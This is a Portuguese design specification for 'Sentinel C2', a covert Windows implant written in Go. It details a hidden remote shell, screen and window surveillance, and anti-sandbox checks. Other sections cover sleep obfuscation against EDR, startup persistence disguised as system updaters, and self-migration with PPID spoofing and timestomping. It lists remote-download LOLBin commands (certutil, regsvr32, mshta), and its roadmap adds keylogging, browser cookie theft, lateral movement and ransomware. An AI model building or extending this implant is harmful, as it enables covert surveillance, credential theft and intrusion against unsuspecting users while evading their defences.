# ESPECIFICAÇÃO TÉCNICA: SENTINEL C2 - AGENTE IMPLANTE (GOLANG)

**Versão:** 1.0.6  
**Status:** Rascunho de Aprovação  
**Data:** 25 de Outubro de 2025  
**Linguagem:** Go (Golang) 1.22+  
**Alvo:** Microsoft Windows (x64)

---

## 1. Introdução e Arquitetura do Implante

O Agente (referido neste documento como "Implante") é o componente residente que executa na máquina alvo. Ele é projetado como um binário estático único, sem dependências externas (DLLs), otimizado para furtividade (stealth), resiliência e baixo consumo de recursos.

A arquitetura do Implante é baseada em **Goroutines** (concorrência leve) para gerenciar a comunicação assíncrona e a execução paralela de tarefas de vigilância.

### Stack Tecnológico

- **Linguagem:** Go (Golang)
- **Comunicação:** Biblioteca `github.com/gorilla/websocket`
- **Coleta de Sistema:** Biblioteca `github.com/shirou/gopsutil`
- **Captura de Tela:** Biblioteca `github.com/kbinani/screenshot`
- **Compilação:** Flags de linker para remoção de símbolos e supressão de console

---

## 2. Estrutura Modular (Packages)

Para garantir a manutenibilidade e a separação de responsabilidades, o código fonte deve ser organizado nos seguintes pacotes internos:

| Pacote | Responsabilidade |
|--------|------------------|
| `core/connection` | Gerencia o ciclo de vida do WebSocket, reconnection backoff e autenticação. |
| `modules/recon` | Coleta dados de telemetria (CPU, RAM, Janela Ativa) e identidade (HWID). |
| `modules/executor` | Recebe comandos textuais e os executa no shell do sistema operacional. |
| `modules/surveillance` | Realiza captura de tela e processamento de imagem. |
| `utils/stealth` | Implementa persistência, ofuscação e técnicas anti-forense. |

---

## 3. Ciclo de Vida e Comunicação

O Implante opera em um loop infinito de eventos, orientado pela conexão WebSocket.

### 3.1 Processo de Inicialização (Bootstrap)

1. **Anti-Analysis Check (VM/Sandbox):** (Ver Seção 5.4).

2. **Melt/Migration Check:** O Implante verifica se está no diretório "correto" (definido via lógica pseudo-aleatória). Se não estiver, ele se copia para o novo local, executa a cópia e encerra o processo atual. (Ver Seção 6.2).

3. **Identificação:** Gera ou recupera o Hardware ID (HWID). Recomenda-se usar o UUID da placa-mãe (`wmic csproduct get uuid`) ou um hash do MAC Address.

4. **Conexão:** Tenta estabelecer conexão com o Sentinel Core (C2) (`ws://ip-server/ws-sentinel`).

5. **Autenticação (Handshake):**
   - Gera o Header de autenticação: `X-Agent-Auth: <HASH_OFUSCADO>`.
   - Se receber `401`, aborta e entra em modo de espera longo (1h).
   - Se receber `101 Switching Protocols`, a sessão está ativa.

6. **Subscrição:** Envia frame STOMP `SUBSCRIBE` para o tópico `/topic/commands/{HWID}`.

### 3.2 Rotinas Concorrentes (Goroutines)

Após a conexão, o Implante deve disparar duas goroutines principais:

1. **Telemetry Ticker (Heartbeat):**
   - Acorda a cada 5 segundos (com jitter de ±2s para evitar padrões).
   - Coleta dados via `recon`.
   - Serializa JSON e envia para `/app/telemetry`.

2. **Command Listener (Main Loop):**
   - Bloqueia aguardando mensagens do WebSocket.
   - Ao receber JSON, faz o unmarshal para a struct `CommandObject`.
   - Despacha para o `modules/executor` apropriado.

### 3.3 Modos de Comunicação (Beacon vs Session)

O implante deve suportar dois modos operacionais que podem ser alternados via comando do C2:

**Modo Session (Padrão - Alta Interatividade):**
- Conexão persistente mantida continuamente
- Latência mínima para execução de comandos
- Heartbeat a cada 5 segundos
- Ideal para: Operações ativas, execução de comandos em tempo real

**Modo Beacon (Stealth - Baixa Interatividade):**
- Conexão intermitente (check-in periódico)
- Intervalo configurável: 30s, 1min, 5min, 15min, 30min, 1h
- Implante se conecta, busca comandos pendentes, executa, retorna resultados e desconecta
- Reduz drasticamente o footprint de rede
- Ideal para: Persistência de longo prazo, ambientes monitorados

**Implementação:**
- O C2 pode enviar comando `SWITCH_MODE` com parâmetro `beacon:300` (5 minutos)
- No modo beacon, o implante armazena comandos em fila local se houver múltiplas tarefas
- Utilizar `time.Sleep()` com jitter entre check-ins para evitar periodicidade detectável

---

## 4. Contratos de Dados e Implementação

O Implante deve implementar estritamente os contratos JSON definidos na especificação do Backend.

### 4.1 Telemetria (Recon Module)

**Struct Go (DTO):**

```go
type Heartbeat struct {
    Hwid         string  `json:"hwid"`
    Hostname     string  `json:"hostname"`
    OS           string  `json:"os_info"`
    IP           string  `json:"ip_local"`
    CPULoad      float64 `json:"cpu_load"`
    RAMUsage     uint64  `json:"ram_usage"` // Em MB
    ActiveWindow string  `json:"active_window"`
}
```

**Implementação:**

- **CPULoad:** Usar `cpu.Percent(0, false)`.
- **ActiveWindow:** Em Windows, requer chamada via syscall para `GetForegroundWindow` e `GetWindowText` da `user32.dll`.

### 4.2 Execução de Comandos (Executor Module)

O módulo executor deve atuar como um switch-case baseado no campo `type` do comando recebido.

**Mapeamento de Ações:**

| Tipo Comando | Função Go Correspondente | Detalhes de Implementação |
|--------------|-------------------------|---------------------------|
| `SHELL` | `ExecuteShell(args []string)` | Usa `exec.Command`. **Crítico:** Definir `SysProcAttr{HideWindow: true}` para não piscar tela preta. |
| `SCREENSHOT` | `CaptureScreen()` | Captura todos os displays, une em uma imagem, codifica JPEG e envia. |
| `KILL_PROC` | `KillProcess(procName string)` | Itera sobre lista de processos (psutil), compara nomes e chama `Process.Kill()`. |
| `MESSAGE` | `ShowMessageBox(title, msg)` | Usa `syscall.NewLazyDLL("user32.dll").NewProc("MessageBoxW")`. |
| `PROCESS_LIST` | `GetProcessList()` | Retorna JSON estruturado com PID, Nome e Memória. |
| `OPEN_URL` | `OpenBrowser(url string)` | Executa `rundll32 url.dll,FileProtocolHandler <url>`. |

### 4.3 Retorno de Shell (Command Result)

**Struct Go:**

```go
type CommandResult struct {
    CommandID string `json:"command_id"`
    Hwid      string `json:"hwid"`
    Status    string `json:"status"` // "SUCCESS" ou "ERROR"
    Output    string `json:"output"`
}
```

**Lógica de Captura:**

Ao executar o `exec.Command`, deve-se capturar tanto o `StdoutPipe` quanto o `StderrPipe`. A resposta final deve concatenar ambos para garantir que mensagens de erro do Windows (ex: "Comando não encontrado") sejam enviadas ao C2.

### 4.4 Envio de Evidências (Binary Upload)

Para o envio de screenshots, o processo é:

1. Capturar imagem em memória (`image.Image`).
2. Criar um buffer de bytes.
3. Codificar para JPEG com qualidade média (ex: 75%) para reduzir latência de rede (`jpeg.Encode(buf, img, opts)`).
4. Converter o buffer para String Base64 (`base64.StdEncoding.EncodeToString`).
5. Empacotar no JSON `ScreenshotUploadDTO` e enviar.

---

## 5. Evasão e Segurança (Stealth)

### 5.1 Ofuscação do Segredo (Header-Key)

A chave de API (`X-Agent-Auth`) não deve estar em texto plano (`const Key = "INSANO..."`).

**Técnica:** Armazenar a chave como um array de bytes XOR-encoded. Em tempo de execução, o Implante faz a operação XOR reversa para obter a chave real apenas no momento do uso.

### 5.2 Compilação Silenciosa (Build Flags)

Para garantir que o executável não abra janelas e seja o menor possível:

```bash
go build -ldflags "-H=windowsgui -s -w" -o sentinel.exe main.go
```

- **`-H=windowsgui`:** Suprime a janela de console (STDIN/STDOUT/STDERR) no Windows. O processo roda em segundo plano.
- **`-s -w`:** Remove a tabela de símbolos e informações de debugging (DWARF), dificultando a engenharia reversa e reduzindo o tamanho do binário.

### 5.3 Resiliência a Falhas (Panic Recovery)

O Implante nunca deve fechar (crashar) por erro de execução.

- Todas as goroutines devem ser envolvidas em uma função anônima com `defer recover()`.
- Se um comando falhar (ex: tentar matar processo inexistente), o erro é capturado, logado internamente (ou enviado como resposta de erro) e o loop principal continua.

### 5.4 Detecção de Ambiente (Anti-VM / Anti-Analysis)

Antes de iniciar qualquer conexão, o agente deve verificar se está em um ambiente hostil.

**Verificações Sugeridas:**

1. **Contagem de Núcleos:** Se `runtime.NumCPU() < 2`, abortar (VMs de sandbox geralmente têm 1 vCPU).
2. **Memória RAM:** Se RAM total < 2GB, abortar.
3. **Artefatos de Virtualização:** Procurar por arquivos/processos específicos (ex: `VBoxService.exe`, `vmtoolsd.exe`).
4. **Contramedida:** Se detectado, o processo deve entrar em loop infinito consumindo 0% CPU ou encerrar silenciosamente sem gerar log de erro.

> **Nota de Implementação:** Para técnicas de detecção mais avançadas (como RDTSC timing attacks ou verificação de drivers específicos de hypervisor), consulte a referência [MITRE T1497 - Virtualization/Sandbox Evasion] na seção 10.

### 5.5 Sleep Obfuscation (Anti-Análise de Memória)

Técnica moderna identificada em frameworks como Havoc C2 que visa proteger o implante durante períodos de inatividade.

**Problema:** Enquanto o implante está em `Sleep()` aguardando o próximo heartbeat, sua memória pode ser escaneada por EDR/AV para buscar assinaturas ou strings suspeitas.

**Solução - Sleep Obfuscation:**

1. **Antes de dormir:**
   - Encriptar regiões críticas da memória (chaves, configurações, strings de C2)
   - Usar XOR simples ou AES com chave derivada de dados do sistema
   - Armazenar apenas o material criptográfico mínimo necessário para descriptografar

2. **Durante o sleep:**
   - A memória do processo contém apenas dados ofuscados
   - Scanners de memória não encontram indicadores claros de malware

3. **Ao acordar:**
   - Descriptografar as regiões críticas de volta para uso
   - Executar operações normais
   - Antes do próximo sleep, repetir o ciclo

**Implementação em Go:**
```
Estrutura sugerida (sem código completo):
1. Criar função obfuscateMemory() que XOR todas as strings sensíveis
2. Criar função deobfuscateMemory() para reverter
3. Envolver todos os time.Sleep() com:
   - obfuscateMemory()
   - time.Sleep(duration)
   - deobfuscateMemory()
```

**Benefício:** Reduz significativamente a eficácia de memory scanning em tempo de execução, técnica que neutraliza EDRs modernos como Windows Defender.

---

## 6. Persistência e Polimorfismo de Localização

### 6.1 Persistência Furtiva (Startup Folder)

Para evitar a chave Run do Registro (que é muito monitorada), utilizaremos a pasta de inicialização do usuário.

**Caminho Alvo:**

```
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
```

**Estratégia:**

1. Ao executar, o agente verifica se existe um atalho (`.lnk`) ou cópia de si mesmo nesta pasta.
2. Se não existir, ele cria.
3. **Stealth:** O nome do arquivo na pasta Startup não deve ser `Sentinel.exe`. Deve ser algo genérico do sistema, como `OneDriveUpdate.exe` ou `WindowsHealthCheck.exe`.

### 6.2 Migração de Diretório (Melt & Move)

O agente não deve ficar estático em um único local. Ele deve se mover periodicamente para dificultar a remoção.

**Lógica de Migração:**

1. **Lista de Caminhos Seguros:** O código terá um slice de caminhos internos onde ele tem permissão de escrita sem Admin (User-Mode):
   - `%LOCALAPPDATA%\Temp`
   - `%APPDATA%\Microsoft\Teams\Cache`
   - `%LOCALAPPDATA%\Google\Chrome\User Data`
   - `%USERPROFILE%\Documents`

2. **Schedule de Troca:** O agente sorteia um intervalo aleatório (ex: entre 4h e 12h de execução).

3. **O Salto:** Quando o tempo expira:
   - Sorteia um novo caminho da lista.
   - Copia o binário atual para o novo caminho com um novo nome aleatório (ex: `svc_host_v2.exe`).
   - Atualiza o atalho de inicialização para apontar para o novo local.
   - Executa o novo binário e encerra o processo atual.

> **Aprofundamento Técnico:** A técnica de Melting pode ser combinada com Timestomping (alteração de metadados de data). Para entender como ferramentas forenses rastreiam arquivos deletados ou movidos, estude o conceito de MFT (Master File Table) Analysis e o artefato USN Journal. (Ver Seção 9 - Referências).

---

## 7. Técnicas Avançadas de Evasão (Implementação Prática)

### 7.1 Domain Fronting e Protocol Mimicry

**Domain Fronting** é uma técnica que mascara o destino real da comunicação C2, fazendo-a parecer direcionada a domínios legítimos.

**Conceito:** 
- O implante envia requisições HTTPS para CDNs legítimas (Cloudflare, AWS CloudFront, Azure CDN)
- O header `Host:` interno contém o domínio real do C2
- O SNI (Server Name Indication) externo aponta para um domínio legítimo (ex: `microsoft.com`)
- A CDN roteia para o backend real baseado no header Host

**Benefícios:**
- Tráfego aparece como legítimo (ex: acesso ao Microsoft 365, Google Drive)
- Bypass de firewalls que permitem tráfego para domínios confiáveis
- Dificulta blocklist baseada em IP/domínio

**Limitação:** Alguns provedores de CDN (Google, Amazon) já mitigaram essa técnica. Cloudflare ainda pode ser viável em certos cenários.

**Protocol Mimicry:**
- Fazer o tráfego C2 parecer com protocolos legítimos (HTTP, DNS, HTTPS)
- Exemplo: Encapsular comandos em queries DNS TXT records
- Exemplo: Usar formato JSON idêntico ao de APIs públicas conhecidas (Slack API, Discord Webhooks)

### 7.2 PPID Spoofing (Parent Process ID Spoofing)

Esta técnica é viável para a versão 1.0, pois utiliza APIs acessíveis do Windows via Go.

**Conceito:** Mascarar a árvore de processos para que o agente pareça ter sido iniciado por um processo de sistema confiável (ex: `explorer.exe` ou `svchost.exe`), e não pelo usuário ou por um comando suspeito.

**Implementação:**

1. Identificar o PID de um processo pai legítimo (ex: `explorer.exe`).
2. Utilizar a API `InitializeProcThreadAttributeList` e `UpdateProcThreadAttribute` para modificar o atributo de criação do processo.
3. Chamar `CreateProcess` passando a lista de atributos modificada.
4. Isso fará com que ferramentas de análise (como Process Hacker) mostrem o agente como "filho" do `explorer.exe`.

> **Recurso de Estudo:** Para ver uma implementação de referência de PPID Spoofing em Go, procure por projetos de Red Team que utilizam o pacote `golang.org/x/sys/windows`. (Ver Referência [3]).

### 7.3 Mitigações Práticas (Stealth Básico)

- **Renomeação de Processo:** Alterar o nome do executável durante a execução para algo legítimo.
- **Timestomping:** Modificar os metadados de data de criação/modificação do arquivo para coincidir com arquivos do sistema (ex: `kernel32.dll`), dificultando a detecção forense visual.

### 7.4 Living Off the Land (LOTL) - Uso de Binários do Sistema

Em vez de executar comandos diretamente via `cmd.exe` ou `powershell.exe` (que são altamente monitorados), priorizar o uso de **LOLBins** (Living Off the Land Binaries).

**Exemplos de LOLBins para Tarefas Comuns:**

| Tarefa | Binário Suspeito | LOLBin Alternativo |
|--------|------------------|-------------------|
| Executar script | `powershell.exe -c "script"` | `mshta.exe vbscript:Execute("script")` |
| Download de arquivo | `powershell Invoke-WebRequest` | `certutil.exe -urlcache -f http://url arquivo` |
| Executar DLL | `rundll32.exe malicious.dll` | `regsvr32.exe /s /n /u /i:http://url scrobj.dll` |
| Listar processos | `tasklist.exe` | `wmic process get name,processid` |

**Vantagens:**
- Binários assinados pela Microsoft reduzem alertas de AV/EDR
- Comportamento esperado em ambientes corporativos
- Maior dificuldade de detecção por análise comportamental

**Implementação no Executor:**
- Criar mapeamento interno de comandos para LOLBins equivalentes
- Exemplo: Quando o operador solicita download, usar `certutil` em vez de `powershell`

---

## 8. Repositórios de Dados para Ofuscação

Para garantir comportamento polimórfico e evitar detecção por assinaturas estáticas, o implante deve manter repositórios internos de dados que serão selecionados aleatoriamente durante a execução.

### 8.1 Repositório de Nomes de Processos Legítimos

O implante deve conter uma lista de nomes de processos do Windows que são considerados não suspeitos. Estes nomes serão usados para:

- Renomear o executável durante a migração (Seção 6.2)
- Criar cópias com nomes legítimos na pasta Startup (Seção 6.1)

**Categorias de Nomes:**

**Serviços do Sistema:**
- `svchost.exe`
- `RuntimeBroker.exe`
- `backgroundTaskHost.exe`
- `dllhost.exe`
- `conhost.exe`
- `csrss.exe` (usar com cautela - processo crítico)
- `lsass.exe` (usar com cautela - processo crítico)

**Atualizadores e Serviços de Nuvem:**
- `OneDriveSetup.exe`
- `OneDriveUpdate.exe`
- `DropboxUpdate.exe`
- `GoogleUpdateCore.exe`
- `AdobeUpdateService.exe`
- `MicrosoftEdgeUpdate.exe`
- `SkypeBackgroundHost.exe`
- `TeamsUpdate.exe`

**Processos de Diagnóstico e Manutenção:**
- `MoUsoCoreWorker.exe`
- `WindowsUpdateAssistant.exe`
- `WindowsHealthCheck.exe`
- `SystemSettingsAdminFlows.exe`
- `DiagnosticsTelemetry.exe`
- `CompatTelRunner.exe`

**Nota de Implementação:** O implante deve selecionar aleatoriamente um nome dessa lista a cada migração. Evite reusar o mesmo nome consecutivamente. Considere adicionar sufixos numéricos aleatórios (ex: `svchost_12.exe`) para maior variação.

### 8.2 Repositório de Caminhos de Instalação

Lista completa de diretórios seguros onde o implante pode se mover sem privilégios administrativos:

**Diretórios de Cache de Aplicativos:**
- `%LOCALAPPDATA%\Microsoft\Teams\Cache`
- `%LOCALAPPDATA%\Microsoft\OneDrive\logs`
- `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cache`
- `%LOCALAPPDATA%\Mozilla\Firefox\Profiles\[random]\cache2`
- `%APPDATA%\Spotify\Data`
- `%APPDATA%\Discord\Cache`
- `%APPDATA%\Slack\Cache`

**Diretórios de Sistema do Usuário:**
- `%LOCALAPPDATA%\Temp`
- `%APPDATA%\Microsoft\Windows\Recent`
- `%APPDATA%\Microsoft\Protect`
- `%USERPROFILE%\AppData\LocalLow\Microsoft`
- `%USERPROFILE%\Documents\WindowsPowerShell\Modules`

**Diretórios de Fontes e Recursos:**
- `%LOCALAPPDATA%\Microsoft\Windows\Fonts`
- `%APPDATA%\Microsoft\Templates`
- `%LOCALAPPDATA%\Microsoft\WindowsApps`

**Estratégia de Seleção:** O implante deve priorizar diretórios de aplicativos populares que o usuário realmente possui instalado. Fazer uma verificação prévia da existência do diretório antes de usá-lo.

### 8.3 Repositório de User-Agents para Comunicação

Caso o implante precise fazer requisições HTTP/HTTPS além do WebSocket, deve utilizar User-Agents realistas:

**Browsers Modernos (Windows 10/11):**
- `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`
- `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0`
- `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0`

**Aplicativos Desktop:**
- `Microsoft-Delivery-Optimization/10.0`
- `Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.0`
- `OneDrive-Updater/22.181.0828.0001`

### 8.4 Repositório de Extensões de Arquivo para Camuflagem

Para técnicas de DLL Hijacking ou ocultação de arquivos, manter lista de extensões comuns:

**Extensões Comuns (Não Executáveis):**
- `.dll` (Bibliotecas dinâmicas)
- `.tmp` (Arquivos temporários)
- `.log` (Arquivos de log)
- `.dat` (Arquivos de dados)
- `.cache` (Arquivos de cache)
- `.db` (Banco de dados local)

**Nota de Segurança:** Nunca usar extensões duplas suspeitas como `.exe.txt` ou `.pdf.exe` que são facilmente detectadas por sistemas de segurança.

### 8.5 Repositório de Intervalos de Tempo (Jitter)

Para evitar padrões previsíveis de comunicação, o implante deve implementar variação temporal:

**Intervalos de Heartbeat (Telemetria):**
- Base: 5 segundos
- Variação (Jitter): ±2 segundos (range: 3-7 segundos)
- Cálculo: `baseInterval + rand.Intn(jitterRange) - (jitterRange/2)`

**Intervalos de Reconexão (Backoff Exponencial):**
- Tentativa 1: 5 segundos
- Tentativa 2: 15 segundos
- Tentativa 3: 45 segundos
- Tentativa 4: 2 minutos
- Tentativa 5+: 5 minutos
- Máximo: 1 hora

**Intervalos de Migração:**
- Mínimo: 4 horas
- Máximo: 12 horas
- Seleção: Aleatória dentro do range

### 8.6 Repositório de Mensagens de Erro Falsas

Para confundir análise forense caso o implante seja descoberto, pode retornar mensagens de erro genéricas:

**Mensagens de Sistema:**
- `"Windows could not start the service on Local Computer. Error 1053: The service did not respond in a timely fashion."`
- `"The application failed to initialize properly (0xc0000142). Click OK to terminate the application."`
- `"This program cannot be run in DOS mode."`
- `"The code execution cannot proceed because VCRUNTIME140.dll was not found."`

**Uso:** Estas mensagens podem ser exibidas se o implante detectar análise (debugger, sandbox) antes de encerrar.

### 8.7 Repositório de Horários de Operação (Time-Bombing)

Para aumentar furtividade, o implante pode ter "horários comerciais" onde opera com intensidade reduzida:

**Horário de Alta Atividade (Business Hours):**
- Segunda a Sexta: 08:00 - 18:00 (hora local)
- Comportamento: Heartbeat normal (5s), comandos executados imediatamente

**Horário de Baixa Atividade (After Hours):**
- Segunda a Sexta: 18:00 - 08:00
- Fins de Semana: Todo o período
- Comportamento: Heartbeat estendido (30s), comandos em fila para execução posterior

**Feriados e Períodos de Férias:**
- Lista de feriados nacionais (Brasil/EUA)
- Comportamento: Modo hibernação (heartbeat a cada 5 minutos)

**Nota de Implementação:** Esta funcionalidade deve ser configurável via comando do C2 para permitir operações 24/7 quando necessário.

### 8.8 Diretrizes de Implementação dos Repositórios

**Estrutura de Dados:**
```
repositories/
├── process_names.go      // Lista de nomes de processos
├── install_paths.go      // Lista de caminhos de instalação
├── user_agents.go        // Lista de User-Agents
├── file_extensions.go    // Extensões de arquivo
├── time_intervals.go     // Intervalos e jitter
├── error_messages.go     // Mensagens de erro falsas
└── schedules.go          // Horários de operação
```

**Características dos Repositórios:**
- Devem ser arrays/slices constantes embutidos no binário
- Usar função `init()` para pré-carregar e validar os dados
- Implementar função `GetRandom()` para cada repositório que retorne um item aleatório
- Seed do gerador de números aleatórios deve usar `crypto/rand` para maior imprevisibilidade
- Considerar ofuscação dos strings usando XOR ou Base64 para dificultar análise estática

**Exemplo de Interface:**
```
type Repository interface {
    GetRandom() string
    GetAll() []string
    Validate() error
}
```

## 9. Roadmap de Pesquisa Futura (v2.0+)

Estas funcionalidades exigem complexidade elevada (Kernel/Assembly) e ficam para versões futuras:

- **DLL Sideloading:** Compilar como DLL para ser carregada por binários assinados.
- **Syscalls Diretas (Hell's Gate):** Bypassar hooks de EDR fazendo chamadas diretas ao kernel.
- **Process Injection Avançado:** Técnicas como Process Hollowing, Thread Hijacking, APC Injection.
- **Comunicação via Cloud Services:** Usar AWS Lambda, Azure Functions, Google Cloud Storage como C2 endpoint (técnica HazyBeacon).
- **Domain Generation Algorithm (DGA):** Gerar domínios C2 dinamicamente usando algoritmo compartilhado com o servidor.
- **Steganografia:** Esconder comandos C2 em imagens, documentos ou tráfego ICMP.

## 11. Apêndice: Tabela de Comandos Estendida

Esta seção documenta comandos adicionais que podem ser implementados futuramente para expandir as capacidades do implante.

| Tipo Comando | Descrição | Payload Esperado | Prioridade | Complexidade |
|--------------|-----------|------------------|------------|--------------|
| `DOWNLOAD` | Download de arquivo do alvo para o C2 | `["caminho/arquivo.txt"]` | Alta | Média |
| `UPLOAD` | Upload de arquivo do C2 para o alvo | `["base64_content", "destino.exe"]` | Alta | Média |
| `KEYLOG_START` | Inicia keylogger em background | `["duracao_segundos"]` | Média | Alta |
| `KEYLOG_STOP` | Para keylogger e retorna buffer | `[]` | Média | Baixa |
| `CLIPBOARD` | Captura conteúdo atual do clipboard | `[]` | Baixa | Baixa |
| `PERSISTENCE_ADD` | Adiciona método de persistência adicional | `["registry/startup/scheduled"]` | Média | Média |
| `PERSISTENCE_REMOVE` | Remove persistência (limpeza) | `[]` | Baixa | Baixa |
| `EXFIL_BROWSER` | Extrai histórico/cookies de navegadores | `["chrome/firefox/edge"]` | Alta | Alta |
| `LATERAL_MOVE` | Tenta se propagar para outra máquina na rede | `["ip_target", "credenciais"]` | Futura | Muito Alta |
| `ENCRYPT_FILES` | Simula ransomware (para testes) | `["diretorio", "extensoes"]` | Futura | Muito Alta |

---

## 10. Referências e Fontes Técnicas

Esta seção lista os conceitos teóricos e fontes para aprofundamento nas técnicas mencionadas neste documento.

### MITRE ATT&CK Framework

- **T1497** - Virtualization/Sandbox Evasion (Ref: Seção 5.4)
- **T1070.006** - Indicator Removal on Host: Timestomp (Ref: Seção 7.2)
- **T1134.004** - Access Token Manipulation: Parent PID Spoofing (Ref: Seção 7.1)

### Análise Forense de Windows

- **File System Forensic Analysis** (Brian Carrier) - Para entender MFT e USN Journal. (Ref: Seção 6.2)

### Desenvolvimento Ofensivo em Go

- **Black Hat Go** (Steele et al.) - Capítulos sobre interação com WinAPI.
- Repositórios de pesquisa sobre "Golang Windows API" e "Syscalls".